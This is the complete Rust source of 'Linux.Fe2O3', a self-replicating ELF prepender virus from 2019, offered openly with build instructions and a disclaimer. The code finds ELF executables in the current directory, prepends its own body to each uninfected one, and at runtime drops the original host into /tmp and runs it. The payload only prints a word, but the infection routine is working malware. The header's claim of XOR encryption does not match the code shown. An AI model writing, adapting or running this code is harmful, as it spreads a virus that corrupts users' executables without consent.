/*
 This is a ELF prepender written in Rust by TMZ (2019).
 I like writting prependers on languages that I'm learning and find interesting.

 Linux.Fe2O3 (September 2019) - Simple binary infector written in Rust.
 This version encrypts the host code with a simple XOR and decrypts it at runtime.
 It's almost a direct port from my Nim infector Linux.Cephei and Go infector Linux.Liora.
 
 Build with: rustc main.rs -o Linux.Fe2O3
 
 Note that Rust version used was rustc 1.37.0 (eae3437df 2019-08-13).
 It has no external dependencies so it should compile under most systems (tested under x86_64).
 It's also possible to adapt it to be a PE/Mach infector and compile under Windows/macOS.

 Use at your own risk, I'm not responsible for any damages that this may cause.
 A big shout for those who keeps the scene alive!
 
 Feel free to email me: thomazi@linux.com || guilherme@guitmz.com 
 You can also find me at Twitter @TMZvx || @guitmz
 
 https://www.guitmz.com
*/

use std::ffi::{OsStr, OsString};
use std::fs::File;
use std::io::prelude::*;
use std::io::{Read, SeekFrom, Write};
use std::os::unix::fs::OpenOptionsExt;
use std::process::Command;
use std::{env, fs, process};

const ELF_MAGIC: &[u8; 4] = &[0x7f, 0x45, 0x4c, 0x46]; // b"\x7FELF"
const INFECTION_MARK: &[u8; 5] = &[0x40, 0x54, 0x4d, 0x5a, 0x40]; // @TMZ@
const VIRUS_SIZE: u64 = 2696496;

fn payload() {
    println!("bruh");
}

fn get_file_size(path: &OsStr) -> u64 {
    let metadata = fs::metadata(&path).expect("Failed to get file size");
    return metadata.len();
}

fn read_file(path: &OsStr) -> Vec<u8> {
    let buf = fs::read(path).expect("Failed to read file from read_file");
    return buf;
}

fn is_elf(path: &OsStr) -> bool {
    let mut ident = [0; 4];
    let mut f = File::open(path).expect("Failed to open file for ELF testing");
    f.read(&mut ident).expect("Failed to read from file for ELF testing");

    if &ident == ELF_MAGIC {
        // this will work for PIE executables as well
        // but can fail for shared libraries during execution
        return true;
    }
    return false;
}

fn is_infected(path: &OsStr) -> bool {
    let file_size: usize = get_file_size(path) as usize;
    let buf = read_file(path);

    for x in 1..file_size {
        if &buf[x] == &INFECTION_MARK[0] {
            for y in 1..INFECTION_MARK.len() {
                if (x + y) >= file_size {
                    break;
                }
                if &buf[x + y] != &INFECTION_MARK[y] {
                    break;
                }
                if y == INFECTION_MARK.len() - 1 {
                    return true;
                }
            }
        }
    }
    return false;
}

fn infect(virus: &OsString, target: &OsStr) {
    let mut host_buf = read_file(target);
    let mut virus_buf = vec![0; VIRUS_SIZE as usize];
    let mut f = File::open(virus).expect("Failed to open file...");
    f.read_exact(&mut virus_buf).expect("Failed to read from file");

    let mut infected = File::create(target).expect("Failed to create infected file");
    infected.write_all(&mut virus_buf).expect("Failed to write virus to infected file");
    infected.write_all(&mut host_buf).expect("Failed to write host to infected file");
    infected.sync_all().expect("Failed to sync infected file");
    infected.flush().expect("Failed to flush infected file");
}

fn run_infected_host(path: &OsString) {
    let mut host_buf = Vec::new();
    let mut infected = File::open(path).unwrap();

    let plain_host_path = "/tmp/host";
    let mut plain_host = fs::OpenOptions::new()
        .create(true)
        .write(true)
        .mode(0o755)
        .open(plain_host_path)
        .unwrap();
    infected.seek(SeekFrom::Start(VIRUS_SIZE)).unwrap();
    infected.read_to_end(&mut host_buf).unwrap();
    drop(infected);

    plain_host.write_all(&mut host_buf).unwrap();
    plain_host.sync_all().unwrap();
    plain_host.flush().unwrap();

    drop(plain_host);
    Command::new(plain_host_path).status().unwrap();
    fs::remove_file(plain_host_path).unwrap();
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let myself = OsString::from(&args[0]);

    let current_dir = env::current_dir().expect("Failed to get home dir");
    for entry in fs::read_dir(current_dir).expect("Failed to read home dir") {
        let entry = entry.unwrap();
        let path = entry.path();

        let metadata = fs::metadata(&path).expect("Failed to get metadata from path");
        if metadata.is_file() {
            let entry_name = path.file_name().expect("Failed to get file name from path");
            if myself == entry_name {
                continue;
            }
            if is_elf(entry_name) {
                if !is_infected(entry_name) {
                    infect(&myself, entry_name);
                }
            }
        }
    }

    if get_file_size(&myself) > VIRUS_SIZE {
        payload();
        run_infected_host(&myself);
    } else {
        process::exit(0)
    }
}
